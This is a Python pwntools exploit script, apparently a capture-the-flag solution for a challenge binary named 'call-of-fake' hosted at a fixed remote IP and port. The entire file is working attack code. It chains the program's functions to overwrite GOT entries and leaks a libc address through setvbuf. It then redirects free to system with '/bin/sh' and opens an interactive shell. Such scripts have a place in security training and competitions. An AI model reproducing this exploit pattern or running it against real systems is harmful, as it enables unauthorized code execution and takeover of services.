#!/usr/bin/python
from pwn import *
import sys

LOCAL = True

HOST = "34.146.170.115"
PORT = 10001
PROCESS = "./call-of-fake"

def ref(v):
    return next(e.search(p64(v)))

def exploit(r):
    for i in range(9):
        r.sendafter("str: ", "A"*0x20)

    FIRE = ref(0x00000000004014f8)
    GETNAMEBUFFER = ref(0x00000000004017e8)
    SETNAME = ref(0x0000000000401540)
    GETTAG = ref(0x0000000000401a4e)
    GETNAME = ref(0x0000000000401b02)
    SETTAG = ref(0x0000000000401a64)
    ADDTWICETAG = ref(0x0000000000401ad8)
    ADDSTORAGE = ref(0x0000000000402b20)
    SET = ref(0x00000000004025b4)
    ALLOC = ref(0x00000000004025ea)
    GET = ref(0x0000000000402658)

    # rsi = e.got["read"]
    payload = p64(ADDTWICETAG)				# call addTwiceTag
    payload += p64(e.got["read"])			# rsi
    payload += "A"*(0x40-len(payload))
    
    # memcpy(e.got["memcpy"], e.got["read"], 8)
    payload += p64(SET)						# call set
    payload += p64(e.got["memcpy"])			# rdi
    payload += p64(8)						# rdx
    payload += "B"*(0x80-len(payload))

    # rsi = e.got["free"]
    payload += p64(ADDTWICETAG)				# call addTwiceTag
    payload += p64(e.got["free"])			# rsi
    payload += "C"*(0xe0-len(payload))

	# read(0, e.got["free"], 0x20)          # => payload2
    payload += p64(SET)                     # call set
    payload += p64(0)						# rdi
    payload += p64(0x20)					# rdx
    payload += "F"*(0x140-len(payload))

    # free(e.got["free"]+0x10) => puts(e.got["free"]+0x10)
    payload += p64(FIRE)    
    payload += p64(0)
    payload += p64(0)
    payload += p64(0)
    payload += p64(e.got["free"]+0x10)      # object string ptr
    payload += "F"*(0x1a0-len(payload))

    # rsi = e.got["free"]
    payload += p64(ADDTWICETAG)				
    payload += p64(e.got["free"])			# rsi 
    payload += "F"*(0x200-len(payload))

    # read(e.got["free"], 0x20)             # => payload3
    payload += p64(SET)
    payload += p64(0)
    payload += p64(0x20)
    payload += "F"*(0x260-len(payload))

    # free(e.got["free"]+0x10) => system("/bin/sh")
    payload += p64(FIRE)
    payload += p64(0)
    payload += p64(0)
    payload += p64(0)
    payload += p64(0x407090-8)
    
    r.sendafter(": ", payload)

    pause()

    # send payload for read(0, e.got["free], 0x20)
    payload2 = p64(0x0000000000401150) + p64(0x21)
    payload2 += p64(0) + p64(e.got["setvbuf"])
    r.send(payload2)

    # read the output of ~objectString leak
    LEAK = u64(r.recvline()[:-1].ljust(8, "\x00"))
    libc.address = LEAK - libc.symbols["setvbuf"]

    log.info("LEAK     : %s" % hex(LEAK))
    log.info("LIBC     : %s" % hex(libc.address))

    pause()

    # send payload for second free overwrite
    payload3 = p64(libc.symbols["system"]) + p64(0x21)
    payload3 += p64(next(libc.search("/bin/sh"))) 

    r.send(payload3)

    r.interactive()

    return


if __name__ == "__main__":
    e = ELF("./call-of-fake")
    libc = ELF("./libc.so.6")

    if len(sys.argv) > 1:
        LOCAL = False
        r = remote(HOST, PORT)
    else:
        LOCAL = True
        r = process("./call-of-fake")
        print(util.proc.pidof(r))
        pause()

    exploit(r)
